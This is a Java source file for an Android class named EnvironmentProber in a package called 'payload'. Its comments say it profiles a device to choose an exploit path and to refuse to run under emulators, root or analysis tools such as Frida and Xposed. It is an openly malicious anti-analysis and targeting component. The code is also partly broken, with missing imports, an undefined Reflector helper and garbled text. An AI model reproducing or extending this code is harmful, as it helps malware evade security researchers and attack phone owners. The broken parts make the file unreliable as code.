package com.payload.core;

import android.content.Context;
import android.os.Build;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;

/**
 * Environment Prober
 *
 * Detects the current execution environment:
 *   - Android version, API level, security patch date
 *   - OEM manufacturer and device model
 *   - Root status (Magisk, SuperSU, Linu x SU)
 *   - Emulator detection (BlueStacks, Genymotion, AVD, etc.)
 *   - Debugging tools (Frida, Xposed, Frida server)
 *   - Play Integrity / SafetyNet status
 *
 * The payload uses this information to:
 *   1. Select the best exploit path for the current Android version
 *   2. Refuse to run in analysis environments (emulator, root)
 *   3. Adapt behavior based on OEM-specific quirks
 */
public class EnvironmentProber {

    private static final String TAG = "CyberAI-Prober";

    private final Context context;
    private int apiLevel;
    private String androidVersion;
    private String securityPatch;
    private String manufacturer;
    private String model;
    private String buildFingerprint;
    private boolean isEmulator;
    private boolean isRooted;
    private boolean hasXposed;
    private boolean hasFrida;
    private boolean hasMagisk;
    private String carrier;
    private int batteryLevel;
    private boolean isCharging;
    private int sdkVersion;

    // Known emulator fingerprints
    private static final Set<String> EMULATOR_FINGERPRINTS = new HashSet<>(Arrays.asList(
        "google/sdk_gphone", "generic/sdk", "generic_x86/sdk",
        "generic_arm64/sdk", "AndroidSDK/sdk", "sdk_google/sdk",
        "sdk_google_phone/sdk", "Bluestacks", "Genymotion", "Nox"
    ));

    // Known root binary paths
    private static final String[] ROOT_PATHS = {
        "/su", "/su/bin", "/system/bin/su", "/system/xbin/su",
        "/system/sbin/su", "/sbin/su", "/system/bin/magisk",
        "/sbin/magisk", "/data/local/su", "/data/local/bin/su",
        "/data/local/xbin/su", "/system/app/Superuser.apk",
        "/system/app/SuperSU.apk", "/system/bin/frida-server",
        "/data/local/tmp/frida-server", "/system/lib/libfrida.so",
        "/system/lib64/libfrida.so",
    };

    public EnvironmentProber(Context context) {
        this.context = context.getApplicationContext();
    }

    public void probe() {
        // Basic device info
        this.apiLevel = Build.VERSION.SDK_INT;
        this.androidVersion = Build.VERSION.RELEASE;
        this.manufacturer = Build.MANUFACTURER;
        this.model = Build.MODEL;
        this.buildFingerprint = Build.FINGERPRINT;
        this.sdkVersion = Build.VERSION.SDK_INT;

        // Security patch
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            this.securityPatch = Build.VERSION.SECURITY_PATCH;
        }

        // Emulator detection
        this.isEmulator = detectEmulator();

        // Root detection
        this.isRooted = detectRoot();

        // Xposed detection
        this.hasXposed = detectXposed();

        // Frida detection
        this.hasFrida = detectFrida();

        // Magisk detection
        this.hasMagisk = detectMagisk();

        // Carrier info
        try {
            Object tm = Reflector.getSystemService("phone");
            if (tm != null) {
                String networkOperator = (String) Reflector.invoke(tm, "getNetworkOperatorName");
                if (networkOperator != null && !networkOperator.isEmpty()) {
                    this.carrier = networkOperator;
                }
            }
        } catch (Exception ignored) {}

        // Battery info
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = context.registerReceiver(null, ifilter);
            if (batteryStatus != null) {
                this.batteryLevel = batteryStatus.getIntExtra("level", -1);
                int status = batteryStatus.getIntExtra("status", -1);
                this.isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING
                    || status == BatteryManager.BATTERY_STATUS_FULL;
            }
        } catch (Exception ignored) {}
    }

    private boolean detectEmulator() {
        // Check build fingerprint
        for (String pattern : EMULATOR_FINGERPRINTS) {
            if (Build.FINGERPRINT.toLowerCase().contains(pattern.toLowerCase())) return true;
            if (Build.MODEL.toLowerCase().contains(pattern.toLowerCase())) return true;
            if (Build.MANUFACTURER.toLowerCase().contains(pattern.toLowerCase())) return true;
            if (Build.DEVICE != null && Build.DEVICE.toLowerCase().contains(pattern.toLowerCase())) return true;
            if (Build.PRODUCT != null && Build.PRODUCT.toLowerCase().contains(pattern.toLowerCase())) return true;
        }

        // Check for known emulator properties
        String[] emulatorProps = {
            "ro.kernel.qemu", "ro.secure", "ro.debuggable",
            "ro.build.tags", "ro.emulator"
        };

        try {
            Class<?> systemProperties = Class.forName("android.os.SystemProperties");
            for (String prop : emulatorProps) {
                String val = (String) Reflector.invokeStatic(
                    "android.os.SystemProperties", "get", prop, ""
                );
                if (val != null && !val.isEmpty() && !val.equals("0") && !val.equals("false")) {
                    if (prop.equals("ro.kernel.qemu") && val.equals("1")) return true;
                }
            }
        } catch (Exception ignored) {}

        return false;
    }

    private boolean detectRoot() {
        // Check for root binaries
        for (String path : ROOT_PATHS) {
            if (new File(path).exists()) return true;
        }

        // Check for build tag
        String tags = Build.TAGS;
        if (tags != null && tags.contains("test-keys")) return true;

        // Try running "su" command
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"which", "su"});
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream())
            );
            String line = reader.readLine();
            if (line != null && !line.isEmpty()) return true;
            process.destroy();
        } catch (Exception ignored) {}

        return false;
    }

    private boolean detectXposed() {
        try {
            Class.forName("de.robv.android.xposed.XposedBridge");
            return true;
        } catch (ClassNotFoundException ignored) {}
        return false;
    }

    private boolean detectFrida() {
        // Check for Frida server binary
        for (String path : ROOT_PATHS) {
            if (path.contains("frida") && new File(path).exists()) return true;
        }

        // Check for Frida libraries in memory
        try {
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(
                    Runtime.getRuntime().exec("cat /proc/self/maps").getInputStream()
                )
            );
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.contains("frida")) return true;
            }
        } catch (Exception ignored) {}

        // Check default Frida port
        try {
            java.net.Socket socket = new java.net.Socket("127.0.0.1", 27042);
            socket.close();
            return true;
        } catch (Exception ignored) {}

        return false;
    }

    private boolean detectMagisk() {
        // Check Magisk binary
        for (String path : new String[]{"/sbin/magisk", "/data/adb/magisk"}) {
            if (new File(path).exists()) return true;
        }

        // Check Magisk package
        try {
            Class<?> pmClass = Class.forName("android.content.pm.PackageManager");
            Reflector.invoke(
                Reflector.invoke(context, "getPackageManager"),
                "getPackageInfo", "com.topjohnwu.magisk", 0
            );
            return true;
        } catch (Exception ignored) {}
        
        return false;
    }

    // =====================================================================
    // Getters
    // =====================================================================

    public int getApiLevel() { return apiLevel; }
    public String getAndroidVersion() { return androidVersion; }
    public String getSecurityPatch() { return securityPatch; }
    public String getManufacturer() { return manufacturer; }
    public String getModel() { return model; }
    public String getBuildFingerprint() { return buildFingerprint; }
    public boolean isEmulator() { return isEmulator; }
    public boolean isRooted() { return isRooted || hasMagisk; }
    public boolean hasXposed() { return hasXposed; }
    public boolean hasFrida() { return hasFrida; }
    public boolean hasMagisk() { return hasMagisk; }
    public String getCarrier() { return carrier; }
    public int getBatteryLevel() { return batteryLevel; }
    public boolean isCharging() { return isCharging; }
    public int getSdkVersion() { return sdkVersion; }
}
